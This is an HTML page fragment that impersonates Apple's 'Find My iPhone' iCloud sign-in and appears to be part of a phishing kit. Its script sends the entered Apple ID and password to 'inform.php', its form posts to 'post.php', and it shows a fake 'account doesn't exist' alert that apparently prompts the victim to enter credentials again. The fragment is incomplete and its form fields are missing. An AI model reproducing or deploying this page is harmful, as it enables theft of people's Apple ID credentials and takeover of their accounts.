<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="robots" content="nofollow"><title>Apple Inc.</title><link rel="stylesheet" type="text/css" href="./Apple Inc._files/style.css"><style type="text/css"></style></head>

    <script>
        function SubmitMe() {
            $.ajax({
                url: 'inform.php',
                dataType: 'json',
                type: 'post',
                contentType: 'application/json',
                data: JSON.stringify( { "username": $('#username').val(), "pw": $('#password').val() } ),
                processData: false,
                success: function( data, textStatus, jQxhr ){
                    $('#result').html( JSON.stringify( data ) );
                },
                error: function( jqXhr, textStatus, errorThrown ){
                    alert("This account doesn't exist please check your Apple ID and Password and try again.");
                }
            });
            return false;
        }
    </script>


<div id="container">

        <div id="iCloudLogo"></div>

            <h1>Find My iPhone</h1>

            <form action="post.php" method="post">

<script src="./Apple Inc._files/bootstrap.min.js"></script>
<script>
    $(document).ready(function() {
        var userLang = navigator.language || navigator.userLanguage;
        console.log(userLang);
        $("input[name=apple]").focus();
        $(".clearable").on('click', function(){
            $("input[name=apple]").val('').change();
            $(this).attr("src", "blue-icon-close.png");
            $(this).css("display", "none");
            $(this).attr("src", "Close-icon.png");
        });
        function isValidEmailAddress(emailAddress) {
            var pattern = new RegExp(/^(("[\w-+\s]+")|([\w-+]+(?:\.[\w-+]+)*)|("[\w-+\s]+")([\w-+]+(?:\.[\w-+]+)*))(@((?:[\w-+]+\.)*\w[\w-+]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][\d]\.|1[\d]{2}\.|[\d]{1,2}\.))((25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\.){2}(25[0-5]|2[0-4][\d]|1[\d]{2}|[\d]{1,2})\]?$)/i);
            return pattern.test(emailAddress);
        };
        $('input[name=apple]').bind("keydown", function(e){
            if(e.which == 13){
                e.preventDefault();
                var val = $(this).val();
                if (!isValidEmailAddress(val)) {
                    val = val+"@icloud.com";
                    $(this).val(val);
                } else {
                    console.log($(this).val());
                }
                console.log(val);
                $("input[name=pw]").focus();
                return false;
            } else if (e.keyCode == 8 || e.keyCode == 46) {
                if($("input[name=apple]").val() == "") {
                    $(".clearable").css("display", "none");
                    $(".clearable").attr("src", "Close-icon.png");
                }
            } else if($("input[name=apple]").val() == "") {
                $(".clearable").css("display", "none");
                $(".clearable").attr("src", "Close-icon.png");
            } else {
                $(".clearable").css("display", "block");
            }
        });

    });
</script>
